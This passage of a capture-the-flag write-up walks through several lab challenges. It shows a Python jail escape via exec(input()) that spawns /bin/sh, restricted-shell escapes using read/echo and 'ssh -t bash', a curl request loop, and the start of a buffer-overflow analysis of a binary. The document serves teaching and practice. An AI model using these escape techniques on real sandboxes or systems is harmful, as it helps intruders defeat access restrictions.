+</span></span><span class="line"><span class="cl"><span class="o">[</span>!<span class="o">]</span> Your  choice: rock,paper,scissors                                                                               
+</span></span><span class="line"><span class="cl">                                                                                                                    
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> You won this round! Congrats!                                                                                   
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> You are worthy! Here is your prize: HTB<span class="o">{</span>r0ck_p4p3R_5tr5tr_l0g1c_buG<span class="o">}</span>
+</span></span></code></pre></div><p><code>HTB{r0ck_p4p3R_5tr5tr_l0g1c_buG}</code></p>
+<h3 id="nehebkaus-trap">Nehebkaus Trap</h3>
+<blockquote>
+<p>In search of the ancient relic, you go looking for the Pharaoh&rsquo;s tomb inside the pyramids. A giant granite block falls and blocks your exit, and the walls start closing in! You are trapped. Can you make it out alive and continue your quest?
+<strong>Difficulty: medium</strong></p>
+</blockquote>
+<hr>
+<p>Connecting to the nc link, we find that it&rsquo;s a trap:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"> nc 104.248.169.117 <span class="m">32684</span>
+</span></span><span class="line"><span class="cl">    __
+</span></span><span class="line"><span class="cl">   <span class="o">{</span>00<span class="o">}</span>                                                                                                             
+</span></span><span class="line"><span class="cl">   <span class="se">\_</span>_/                                                                                                             
+</span></span><span class="line"><span class="cl">   /^/                                                                                                              
+</span></span><span class="line"><span class="cl">  <span class="o">(</span> <span class="o">(</span>                                                                                                               
+</span></span><span class="line"><span class="cl">   <span class="se">\_\_</span>____                                                                                                         
+</span></span><span class="line"><span class="cl">   <span class="o">(</span>_______<span class="o">)</span>                                                                                                        
+</span></span><span class="line"><span class="cl">  <span class="o">(</span>_________<span class="o">()</span>Ooo.                                                                                                  
+</span></span><span class="line"><span class="cl">                                                                                                                    
+</span></span><span class="line"><span class="cl"><span class="o">[</span> Nehebkau<span class="err">&#39;</span>s Trap <span class="o">]</span>                                                                                                 
+</span></span><span class="line"><span class="cl">                                                                                                                    
+</span></span><span class="line"><span class="cl">You are trapped!                                                                                                    
+</span></span><span class="line"><span class="cl">Can you escape?
+</span></span><span class="line"><span class="cl">&gt;
+</span></span></code></pre></div><p>Various shell commands do not work, and we quickly find that several critical inputs are blacklisted, such as single and double quotes, or dots.
+The snake is our first subtle hint, we are likely trapped in a python jail! There is a posting on <a href="https://book.hacktricks.xyz/generic-methodologies-and-resources/python/bypass-python-sandboxes">hacktricks that covers this type of problem</a>. Unfortunately, most of the suggestions will not work for us with restrictions on dot, quotes, space and even uderscores. We can, however, print the globals and locals:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="o">&gt;</span> <span class="nb">print</span><span class="p">(</span><span class="nb">globals</span><span class="p">())</span>                                                                                                  
+</span></span><span class="line"><span class="cl">                                                                                                                    
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Input</span> <span class="n">accepted</span><span class="err">!</span>                                                                                                 
+</span></span><span class="line"><span class="cl">                                                                                                                    
+</span></span><span class="line"><span class="cl"><span class="p">{</span><span class="s1">&#39;__name__&#39;</span><span class="p">:</span> <span class="s1">&#39;__main__&#39;</span><span class="p">,</span> <span class="s1">&#39;__doc__&#39;</span><span class="p">:</span> <span class="kc">None</span><span class="p">,</span> <span class="s1">&#39;__package__&#39;</span><span class="p">:</span> <span class="kc">None</span><span class="p">,</span> <span class="s1">&#39;__loader__&#39;</span><span class="p">:</span> <span class="o">&lt;</span><span class="n">_frozen_importlib_external</span><span class="o">.</span><span class="n">SourceFileLoader</span> <span class="nb">object</span> <span class="n">at</span> <span class="mh">0x7f37eeb47c10</span><span class="o">&gt;</span><span class="p">,</span> <span class="s1">&#39;__spec__&#39;</span><span class="p">:</span> <span class="kc">None</span><span class="p">,</span> <span class="s1">&#39;__annotations__&#39;</span><span class="p">:</span> <span class="p">{},</span> <span class="s1">&#39;__builtins__&#39;</span><span class="p">:</span> <span class="o">&lt;</span><span class="n">module</span> <span class="s1">&#39;builtins&#39;</span> <span class="p">(</span><span class="n">built</span><span class="o">-</span><span class="ow">in</span><span class="p">)</span><span class="o">&gt;</span><span class="p">,</span> <span class="s1">&#39;__file__&#39;</span><span class="p">:</span> <span class="s1">&#39;/home/ctf/./jail.py&#39;</span><span class="p">,</span> <span class="s1">&#39;__cached__&#39;</span><span class="p">:</span> <span class="kc">None</span><span class="p">,</span> <span class="s1">&#39;sys&#39;</span><span class="p">:</span> <span class="o">&lt;</span><span class="n">module</span> <span class="s1">&#39;sys&#39;</span> <span class="p">(</span><span class="n">built</span><span class="o">-</span><span class="ow">in</span><span class="p">)</span><span class="o">&gt;</span><span class="p">,</span> <span class="s1">&#39;time&#39;</span><span class="p">:</span> <span class="o">&lt;</span><span class="n">module</span> <span class="s1">&#39;time&#39;</span> <span class="p">(</span><span class="n">built</span><span class="o">-</span><span class="ow">in</span><span class="p">)</span><span class="o">&gt;</span><span class="p">,</span> <span class="s1">&#39;BLACKLIST&#39;</span><span class="p">:</span> <span class="p">(</span><span class="s1">&#39;.&#39;</span><span class="p">,</span> <span class="s1">&#39;_&#39;</span><span class="p">,</span> <span class="s1">&#39;/&#39;</span><span class="p">,</span> <span class="s1">&#39;&#34;&#39;</span><span class="p">,</span> <span class="s1">&#39;;&#39;</span><span class="p">,</span> <span class="s1">&#39; &#39;</span><span class="p">,</span> <span class="s2">&#34;&#39;&#34;</span><span class="p">,</span> <span class="s1">&#39;,&#39;</span><span class="p">),</span> <span class="s1">&#39;Color&#39;</span><span class="p">:</span> <span class="o">&lt;</span><span class="k">class</span> <span class="err">&#39;</span><span class="nc">__main__</span><span class="o">.</span><span class="n">Color</span><span class="s1">&#39;&gt;, &#39;</span><span class="n">_print</span><span class="s1">&#39;: &lt;function _print at 0x7f37eeba3d90&gt;, &#39;</span><span class="n">banner</span><span class="s1">&#39;: &lt;function banner at 0x7f37eeae2c20&gt;, &#39;</span><span class="n">loop</span><span class="s1">&#39;: &lt;function loop at 0x7f37eeae2cb0&gt;, &#39;</span><span class="n">_</span><span class="s1">&#39;: 2}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">&gt;</span> <span class="nb">print</span><span class="p">(</span><span class="nb">locals</span><span class="p">())</span>                                                                                                   
+</span></span><span class="line"><span class="cl">                                                                                                                    
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Input</span> <span class="n">accepted</span><span class="err">!</span>                                                                                                 
+</span></span><span class="line"><span class="cl">                                                                                                                    
+</span></span><span class="line"><span class="cl"><span class="p">{</span><span class="s1">&#39;banned&#39;</span><span class="p">:</span> <span class="p">[],</span> <span class="s1">&#39;inp&#39;</span><span class="p">:</span> <span class="s1">&#39;print(locals())&#39;</span><span class="p">}</span>
+</span></span></code></pre></div><p>If it wasn&rsquo;t found through trial and error yet, we can see the full list of blacklisted characters here:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">BLACKLIST</span><span class="s1">&#39;: (&#39;</span><span class="o">.</span><span class="s1">&#39;, &#39;</span><span class="n">_</span><span class="s1">&#39;, &#39;</span><span class="o">/</span><span class="s1">&#39;, &#39;</span><span class="s2">&#34;&#39;, &#39;;&#39;, &#39; &#39;, &#34;</span><span class="s1">&#39;&#34;, &#39;</span><span class="p">,</span><span class="s1">&#39;)</span>
+</span></span></code></pre></div><p>Under <code>globals</code> we find builtins is present. We must rely on these builtin functions to escape the jail and find our flag. A list of builtin functions can be found <a href="https://docs.python.org/3/library/functions.html">here</a>. Input() caught my eye, as perhaps we can supply stdin that might not be checked through the blacklist:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="o">&gt;</span> <span class="n">a</span><span class="o">=</span><span class="nb">input</span><span class="p">()</span>                                                                                                         
+</span></span><span class="line"><span class="cl">                                                                                                                    
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Input</span> <span class="n">accepted</span><span class="err">!</span>                                                                                                 
+</span></span><span class="line"><span class="cl">                                                                                                                    
+</span></span><span class="line"><span class="cl"><span class="n">Error</span><span class="p">:</span> <span class="n">invalid</span> <span class="n">syntax</span> <span class="p">(</span><span class="o">&lt;</span><span class="n">string</span><span class="o">&gt;</span><span class="p">,</span> <span class="n">line</span> <span class="mi">1</span><span class="p">)</span>
+</span></span></code></pre></div><p>Unfortunately, I received an error before being able to input anything for variable declaration. However, trying <code>input()</code> on its own seems to work as I expected:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="o">&gt;</span> <span class="nb">input</span><span class="p">()</span>                                                                                                           
+</span></span><span class="line"><span class="cl">                                                                                                                    
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Input</span> <span class="n">accepted</span><span class="err">!</span>                                                                                                 
+</span></span><span class="line"><span class="cl">                                                                                                                    
+</span></span><span class="line"><span class="cl"><span class="s1">&#39;&#34;&#39;</span><span class="s2">&#34;Test aWE$%                                                                                                      </span>
+</span></span><span class="line"><span class="cl"><span class="o">&gt;</span>
+</span></span></code></pre></div><p>Here we see no blacklist notice despite putting several blacklisted characters. Perhaps we can use input in a different way? Next I tried <code>input</code> in combination with <code>exec</code>:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="o">&gt;</span> <span class="n">exec</span><span class="p">(</span><span class="nb">input</span><span class="p">())</span>                                                                                                     
+</span></span><span class="line"><span class="cl">                                                                                                                    
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Input</span> <span class="n">accepted</span><span class="err">!</span>                                                                                                 
+</span></span><span class="line"><span class="cl">                                                                                                                    
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;This is a test.&#34;</span><span class="p">)</span>                                                                                            
+</span></span><span class="line"><span class="cl"><span class="n">This</span> <span class="ow">is</span> <span class="n">a</span> <span class="n">test</span><span class="o">.</span>
+</span></span><span class="line"><span class="cl"><span class="o">&gt;</span>
+</span></span></code></pre></div><p>The print worked, and again no notice on blacklisted functions. From here there are several ways to read a flag. Since I wasn&rsquo;t sure what the flag was named or where it might be, I decided to create a shell session using a <a href="https://gtfobins.github.io/">gtfobins</a> payload:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="o">&gt;</span> <span class="n">exec</span><span class="p">(</span><span class="nb">input</span><span class="p">())</span>                                                                                                     
+</span></span><span class="line"><span class="cl">                                                                                                                    
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Input</span> <span class="n">accepted</span><span class="err">!</span>                                                                                                 
+</span></span><span class="line"><span class="cl">                                                                                                                    
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">os</span><span class="p">;</span> <span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s2">&#34;/bin/sh&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">whoami</span>
+</span></span><span class="line"><span class="cl"><span class="n">ctf</span>  
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">ls</span>                                                                                                                  
+</span></span><span class="line"><span class="cl"><span class="n">flag</span><span class="o">.</span><span class="n">txt</span>                                                                                                            
+</span></span><span class="line"><span class="cl"><span class="n">jail</span><span class="o">.</span><span class="n">py</span> 
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">cat</span> <span class="n">flag</span><span class="o">.</span><span class="n">txt</span>                                                                                                        
+</span></span><span class="line"><span class="cl"><span class="n">HTB</span><span class="p">{</span><span class="n">y0u_d3f34t3d_th3_sn4k3_g0d</span><span class="err">!</span><span class="p">}</span>
+</span></span></code></pre></div><p><code>HTB{y0u_d3f34t3d_th3_sn4k3_g0d!}</code></p>
+<h3 id="persistence">Persistence</h3>
+<blockquote>
+<p>Thousands of years ago, sending a GET request to <strong>/flag</strong> would grant immense power and wisdom. Now it&rsquo;s broken and usually returns random data, but keep trying, and you might get lucky&hellip; Legends say it works once every 1000 tries.
+<strong>Difficulty: very easy</strong></p>
+</blockquote>
+<hr>
+<p>The objective for this problem is very straightforward: send a /GET request to IP:PORT/flag and you will receive the flag after ~1000 attempts.  1000 attempts is a rather high number to reach manually, so creating a loop for curl is the way to go:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="cp">#!/bin/bash
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span><span class="k">for</span> i in <span class="o">{</span>1..1000<span class="o">}</span>
+</span></span><span class="line"><span class="cl"><span class="k">do</span>
+</span></span><span class="line"><span class="cl">        curl -s 165.232.100.46:31980/flag 
+</span></span><span class="line"><span class="cl"><span class="k">done</span>
+</span></span></code></pre></div><p>-s flag makes the curl request silent, otherwise we will get transmission informations on every curl attempt. This loop only runs for 1000 attempts, but if you&rsquo;re watching the program you can have it set to run indefinitely and just manually close it when the flag is seen.
+Running the script:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ chmod +x loop.sh
+</span></span><span class="line"><span class="cl">$ ./loop.sh <span class="p">|</span> grep <span class="s2">&#34;HTB&#34;</span>
+</span></span></code></pre></div><p>grep allows us to filter any uninteresting output and only shows our flag.
+Eventually, we see the results pop out at us.</p>
+<pre tabindex="0"><code>HTB{y0u_h4v3_p0w3rfuL_sCr1pt1ng_ab1lit13S!}jW&amp;z3]X8CLb5Q7kR
+</code></pre><p>The flag information includes only HTB and the content in brackets. A cleaner grep would have extracted only the flag.
+Overall, it seems output of the flag is based on a ~0.1% chance. On average, you will get the flag within 1000 requests but not always.
+<code>HTB{y0u_h4v3_p0w3rfuL_sCr1pt1ng_ab1lit13S!}</code></p>
+<h3 id="restricted">Restricted</h3>
+<blockquote>
+<p>You &rsquo;re still trying to collect information for your research on the alien relic. Scientists contained the memories of ancient egyptian mummies into small chips, where they could store and replay them at will. Many of these mummies were part of the battle against the aliens and you suspect their memories may reveal hints to the location of the relic and the underground vessels. You managed to get your hands on one of these chips but after you connected to it, any attempt to access its internal data proved futile. The software containing all these memories seems to be running on a restricted environment which limits your access. Can you find a way to escape the restricted environment?
+<strong>Difficulty: easy</strong></p>
+</blockquote>
+<hr>
+<p>By exploring the provided sshd_config file, we can see for the user restricted we are permitted empty passwords. And so, our entry into the system is through ssh as the user restricted:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ ssh restricted@167.99.86.8 -p <span class="m">32608</span>
+</span></span><span class="line"><span class="cl">Linux ng-restricted-rtgbl-c6f644c76-t5z7n 5.18.0-0.deb11.4-amd64 <span class="c1">#1 SMP PREEMPT_DYNAMIC Debian 5.18.16-1~bpo11+1 (2022-08-12) x86_64</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">The programs included with the Debian GNU/Linux system are free software<span class="p">;</span>
+</span></span><span class="line"><span class="cl">the exact distribution terms <span class="k">for</span> each program are described in the
+</span></span><span class="line"><span class="cl">individual files in /usr/share/doc/*/copyright.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+</span></span><span class="line"><span class="cl">permitted by applicable law.
+</span></span><span class="line"><span class="cl">Last login: Thu Mar <span class="m">23</span> 23:40:20 <span class="m">2023</span> from 167.99.86.8
+</span></span><span class="line"><span class="cl">restricted@ng-restricted-rtgbl-c6f644c76-t5z7n:~$
+</span></span></code></pre></div><p>Upon entry, we can check a few commands and see extremely limited options. We are unable to do traditional navigation commands such as <code>ls</code> or <code>cd</code>. However, we do have access to other powerful bash builtins such as <code>echo</code> and <code>read</code>. We can use <code>echo</code> to browse directories in a similar manner to <code>ls</code>:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">restricted@ng-restricted-rtgbl-c6f644c76-t5z7n:~$ <span class="nb">echo</span> .*
+</span></span><span class="line"><span class="cl">. .. .bash_history .bash_logout .bash_profile .bashrc .bin .profile
+</span></span></code></pre></div><p>In our current directory, there is nothing that looks like a flag. Checking elsewhere:</p>
+<pre tabindex="0"><code class="language-bsh" data-lang="bsh">restricted@ng-restricted-rtgbl-c6f644c76-t5z7n:~$ echo /*
+/bin /boot /dev /etc /flag_8dpsy /home /lib /lib64 /media /memories.dump /mnt /opt /proc /root /run /sbin /srv /sys /tmp /usr /var
+</code></pre><p><code>flag_8dpsy</code> looks like a potential candidate. To view, we can leverage <code>echo</code> and <code>read</code> together:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">restricted@ng-restricted-rtgbl-c6f644c76-t5z7n:~$ <span class="nb">read</span> IFR &lt; /flag_8dpsy<span class="p">;</span> <span class="nb">echo</span> <span class="nv">$IFR</span>
+</span></span><span class="line"><span class="cl">HTB<span class="o">{</span>r35tr1ct10n5_4r3_p0w3r1355<span class="o">}</span>
+</span></span></code></pre></div><hr>
+<p>Alternative Method, selecting <code>bash</code> as ssh terminal.</p>
+<p>User restricted has its default terminal set to rbash, the restricted terminal we previously worked in. However, we can just as easily pick our own terminal agent at ssh launch:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ ssh restricted@167.99.86.8 -p <span class="m">32608</span> -t bash
+</span></span><span class="line"><span class="cl">restricted@ng-restricted-rtgbl-c6f644c76-t5z7n:~$ whoami
+</span></span><span class="line"><span class="cl">restricted
+</span></span><span class="line"><span class="cl">restricted@ng-restricted-rtgbl-c6f644c76-t5z7n:~$ cat /flag_8dpsy 
+</span></span><span class="line"><span class="cl">HTB<span class="o">{</span>r35tr1ct10n5_4r3_p0w3r1355<span class="o">}</span>
+</span></span></code></pre></div><p><code>HTB{r35tr1ct10n5_4r3_p0w3r1355}</code></p>
+<h2 id="pwn">Pwn</h2>
+<h3 id="labyrinth">Labyrinth</h3>
+<blockquote>
+<p>You find yourself trapped in a mysterious labyrinth, with only one chance to escape. Choose the correct door wisely, for the wrong choice could have deadly consequences.
+<strong>Difficulty: easy</strong></p>
+</blockquote>
+<hr>
+<p>We are given a labyrinth executable:</p>
+<pre tabindex="0"><code>$ file labyrinth    
+labyrinth: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter ./glibc/ld-linux-x86-64.so.2, BuildID[sha1]=86c87230616a87809e53b766b99987df9bf89ad8, for GNU/Linux 3.2.0, not stripped
+
+$ checksec --file=labyrinth
+RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified   Fortifiable     FILE
+Full RELRO      No canary found   NX enabled    No PIE          No RPATH   RW-RUNPATH   83 Symbols        No    0  4labyrinth
+</code></pre><p>We see this is a non stripped ELF 64-bit binary, and <code>checksec</code>  reveals no canary and no PIE.</p>
+<p>Running labyrinth, from the very start, we are given a choice between 100 options:</p>
+<pre tabindex="0"><code>▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
+▒-▸        ▒           ▒          ▒
+▒-▸        ▒     O     ▒          ▒
+▒-▸        ▒    &#39;|&#39;    ▒          ▒
+▒-▸        ▒    / \    ▒          ▒
+▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▲△▲△▲△▲△▲△▒
+
+Select door: 
+
+Door: 001 Door: 002 Door: 003 Door: 004 Door: 005 Door: 006 Door: 007 Door: 008 Door: 009 Door: 010 
+Door: 011 Door: 012 Door: 013 Door: 014 Door: 015 Door: 016 Door: 017 Door: 018 Door: 019 Door: 020 
+Door: 021 Door: 022 Door: 023 Door: 024 Door: 025 Door: 026 Door: 027 Door: 028 Door: 029 Door: 030 
+Door: 031 Door: 032 Door: 033 Door: 034 Door: 035 Door: 036 Door: 037 Door: 038 Door: 039 Door: 040 
+Door: 041 Door: 042 Door: 043 Door: 044 Door: 045 Door: 046 Door: 047 Door: 048 Door: 049 Door: 050 
+Door: 051 Door: 052 Door: 053 Door: 054 Door: 055 Door: 056 Door: 057 Door: 058 Door: 059 Door: 060 
+Door: 061 Door: 062 Door: 063 Door: 064 Door: 065 Door: 066 Door: 067 Door: 068 Door: 069 Door: 070 
+Door: 071 Door: 072 Door: 073 Door: 074 Door: 075 Door: 076 Door: 077 Door: 078 Door: 079 Door: 080 
+Door: 081 Door: 082 Door: 083 Door: 084 Door: 085 Door: 086 Door: 087 Door: 088 Door: 089 Door: 090 
+Door: 091 Door: 092 Door: 093 Door: 094 Door: 095 Door: 096 Door: 097 Door: 098 Door: 099 Door: 100
+
+&gt;&gt; 1 
+
+[-] YOU FAILED TO ESCAPE!
+</code></pre><p>An incorrect answer exits the program. We can try to go through this manually, but we can also find the answer in the file itself:</p>
+<pre tabindex="0"><code>$ cat labyrinth
+&lt;..SNIP..&gt;
+                                                                                                                   
+▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒                                                                                 
+▒-▸        ▒           ▒          ▒                                                                                 
+▒-▸        ▒     O     ▒          ▒                                                                                 
+▒-▸        ▒    &#39;|&#39;    ▒          ▒                                                                                 
+▒-▸        ▒    / \    ▒          ▒                                                                                 
+▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▲△▲△▲△▲△▲△▒                                                                                 
+                                                                                                                    
+Select door:                                                                                                        
+                                                                                                                    
+Door: 00%d Door: 0%d Door: %d                                                                                       
+&gt;&gt; 69069                                                                                                            
+You are heading to open the door but you suddenly see something on the wall:                                        
+                                                                                                                    
+&#34;Fly like a bird and be free!&#34;                                                                                      
+                                                                                                                    
+Would you like to change the door you chose?                                                                        
+                                                                                                                    
+&gt;&gt;
+&lt;..SNIP..&gt;
+</code></pre><p>We can see <code>69069</code>, likely accepting valid answers for both 69 and 069.</p>
+<pre tabindex="0"><code>▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
+▒-▸        ▒           ▒          ▒
+▒-▸        ▒     O     ▒          ▒
+▒-▸        ▒    &#39;|&#39;    ▒          ▒
+▒-▸        ▒    / \    ▒          ▒
+▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▲△▲△▲△▲△▲△▒
+
+Select door: 
+
+Door: 001 Door: 002 Door: 003 Door: 004 Door: 005 Door: 006 Door: 007 Door: 008 Door: 009 Door: 010 
+Door: 011 Door: 012 Door: 013 Door: 014 Door: 015 Door: 016 Door: 017 Door: 018 Door: 019 Door: 020 
+Door: 021 Door: 022 Door: 023 Door: 024 Door: 025 Door: 026 Door: 027 Door: 028 Door: 029 Door: 030 
+Door: 031 Door: 032 Door: 033 Door: 034 Door: 035 Door: 036 Door: 037 Door: 038 Door: 039 Door: 040 
+Door: 041 Door: 042 Door: 043 Door: 044 Door: 045 Door: 046 Door: 047 Door: 048 Door: 049 Door: 050 
+Door: 051 Door: 052 Door: 053 Door: 054 Door: 055 Door: 056 Door: 057 Door: 058 Door: 059 Door: 060 
+Door: 061 Door: 062 Door: 063 Door: 064 Door: 065 Door: 066 Door: 067 Door: 068 Door: 069 Door: 070 
+Door: 071 Door: 072 Door: 073 Door: 074 Door: 075 Door: 076 Door: 077 Door: 078 Door: 079 Door: 080 
+Door: 081 Door: 082 Door: 083 Door: 084 Door: 085 Door: 086 Door: 087 Door: 088 Door: 089 Door: 090 
+Door: 091 Door: 092 Door: 093 Door: 094 Door: 095 Door: 096 Door: 097 Door: 098 Door: 099 Door: 100 
+
+&gt;&gt; 69
+
+You are heading to open the door but you suddenly see something on the wall:
+
+&#34;Fly like a bird and be free!&#34;
+
+Would you like to change the door you chose?
+
+&gt;&gt; 69
+
+[-] YOU FAILED TO ESCAPE!
+</code></pre><p>We progressed one stage, but we are still stuck. Is this second input expecting a number, or something else?</p>
+<pre tabindex="0"><code>Fly like a bird and be free!&#34;
+
+Would you like to change the door you chose?
+
+&gt;&gt; AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+
+[-] YOU FAILED TO ESCAPE!
+
+zsh: segmentation fault  ./labyrinth
+</code></pre><p>We reached a segmentation fault, so this might be a target for buffer overflow.</p>
+<p>Using Radare2 to find win address:</p>
+<pre tabindex="0"><code>r2 labyrinth                                                                             
+ -- º|&lt;|&lt;|  -( glu glu glu, im the r2 fish )
+[0x00401140]&gt; aaaa
+INFO: Analyze all flags starting with sym. and entry0 (aa)
+INFO: Analyze all functions arguments/locals (afva@@@F)
+INFO: Analyze function calls (aac)
+INFO: Analyze len bytes of instructions for references (aar)
+INFO: Finding and parsing C++ vtables (avrr)
+INFO: Type matching analysis for all functions (aaft)
+INFO: Propagate noreturn information (aanr)
+INFO: Scanning for strings constructed in code (/azs)
+INFO: Finding function preludes (aap)
+INFO: Enable anal.types.constraint for experimental type propagation
+[0x00401140]&gt; afl
+0x00401140    1     42 entry0
+0x00401180    4     31 sym.deregister_tm_clones
+0x004011b0    4     49 sym.register_tm_clones
+0x004011f0    3     28 sym.__do_global_dtors_aux
+0x00401220    1      2 sym.frame_dummy
+0x00401670    1      1 sym.__libc_csu_fini
+0x00401255    5    208 sym.escape_plan
+0x00401030    1      6 sym.imp.putchar
+0x00401130    1      6 sym.imp.fwrite
+0x004010c0    1      6 sym.imp.fprintf
+0x004010f0    1      6 sym.imp.open
+0x00401100    1      6 sym.imp.perror
+0x00401120    1      6 sym.imp.exit
+0x00401090    1      6 sym.imp.fputc
+0x004010a0    1      6 sym.imp.read
+0x00401080    1      6 sym.imp.close
+0x00401674    1      9 sym._fini
+0x0040137b    1     51 sym.banner
+0x00401050    1      6 sym.imp.puts
+0x00401610    4     93 sym.__libc_csu_init
+0x00401222    1     51 sym.cls
+0x00401060    1      6 sym.imp.printf
+0x00401170    1      1 sym._dl_relocate_static_pie
+0x00401405   15    510 main
+0x00401325    1     86 sym.read_num
+0x00401110    1      6 sym.imp.strtoul
+0x00401000    3     23 sym._init
+0x004013ae    1     87 sym.setup
+0x004010e0    1      6 sym.imp.setvbuf
+0x00401070    1      6 sym.imp.alarm
+0x00401040    1      6 sym.imp.strncmp
+0x004010b0    1      6 sym.imp.fgets
+0x004010d0    1      6 sym.imp.malloc
+</code></pre><p><code>sym.escape_plan</code> looks interesting by name, and the size also suggests there might be a few things going on.</p>
+<pre tabindex="0"><code>pdf @ sym.escape_plan 
+┌ 208: sym.escape_plan ();
+│           ; var uint32_t fildes @ rbp-0x4
+│           ; var void *buf @ rbp-0x5
+│           0x00401255      55             push rbp
+│           0x00401256      4889e5         mov rbp, rsp
+│           0x00401259      4883ec10       sub rsp, 0x10
+│           0x0040125d      bf0a000000     mov edi, 0xa                ; int c
+│           0x00401262      e8c9fdffff     call sym.imp.putchar        ; int putchar(int c)
+│           0x00401267      488b05a22d00.  mov rax, qword [obj.stdout] ; obj.__TMC_END__
+│                                                                      ; [0x404010:8]=0                             
+│           0x0040126e      4889c1         mov rcx, rax                ; FILE *stream
+│           0x00401271      baf0010000     mov edx, 0x1f0              ; 496 ; size_t nitems
+│           0x00401276      be01000000     mov esi, 1                  ; size_t size
+│           0x0040127b      488d3d960d00.  lea rdi, str.________________O_________________n___________________________________n__________________________________n____n_______________________________n_______________________________n_______________________________n_______________________________n_n ; 0x402018 ; &#34;                \O/               \n                 |                 \n                / \               \n\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592   \u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\n\u2592-\u25b8        \u2592           \u2592          \u2592\n\u2592-\u25b8        \u2592           \u2592          \u2592\n\u2592-\u25b8        \u2592           \u2592          \u2592\n\u2592-\u25b8        \u2592           \u2592          \u2592\n\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\xe2&#34; ; const void *ptr           
+│           0x00401282      e8a9feffff     call sym.imp.fwrite         ; size_t fwrite(const void *ptr, size_t size, size_t nitems, FILE *stream)                                                                                       
